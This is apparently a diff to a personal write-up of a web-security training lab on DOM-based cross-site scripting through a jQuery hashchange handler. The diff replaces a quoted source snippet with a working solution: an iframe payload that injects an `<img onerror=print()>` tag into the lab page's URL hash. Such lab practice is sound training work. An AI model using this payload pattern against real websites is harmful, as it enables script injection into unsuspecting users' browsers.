@@ -94,15 +94,11 @@ To solve the lab, deliver an exploit to the victim that calls the `print()` fu
 
 ## Solution
 
-Reading HTML source code shows:
+Go to exploit server and input:
 
 ```
-|<script>|
-||$(window).on('hashchange', function(){|
-||var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');|
-||if (post) post.get(0).scrollIntoView();|
-||});|
-||</script>|
+Hello, world!
+<iframe src="https://0a6d00df0379a2e780168f1000d100bd.web-security-academy.net/#"onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
-I don't understand this lab, need a break.
+View to confirm the payload launches (makes the view print in a loop). Then send to victim to solve the lab.
